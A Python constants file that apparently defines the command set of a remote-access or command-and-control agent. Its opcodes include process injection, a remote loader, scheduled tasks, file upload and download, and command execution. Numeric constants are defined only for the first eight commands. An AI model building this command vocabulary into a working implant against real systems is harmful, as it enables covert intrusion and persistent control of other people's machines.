# constants.py

"""This module defines project-level constants."""

OPCODE_AESGCM = 1 # aesgcm
OPCODE_B64 = 2 # b64
OPCODE_BG = 3 # bg
OPCODE_CAT = 4 # cat
OPCODE_CD = 5 # cd
OPCODE_CLEAR = 6 # clear
OPCODE_DOWNLOAD = 7 # download
OPCODE_ECHO = 8 # echo
# exec
# exit
# help
# httpcl
# include
# inject
# ls
# pkill
# ps
# pwd
# readf
# rloader
# rm
# schtasks
# sha256sum
# sleep
# upload**/


opcodes = ["aesgcm", "b64", "bg", "cat", "cd", "clear", "download", "echo", "exec", "exit", "help", "httpcl",
"include", "inject", "ls", "pkill", "ps", "pwd", "readf", "rloader", "rm", "schtasks", "sha256sum", "sleep",
"upload"]

SUCCESSFUL = "Communication was success.\n"

FAILURE = "Communication failed.\n"

extras = ["list"]

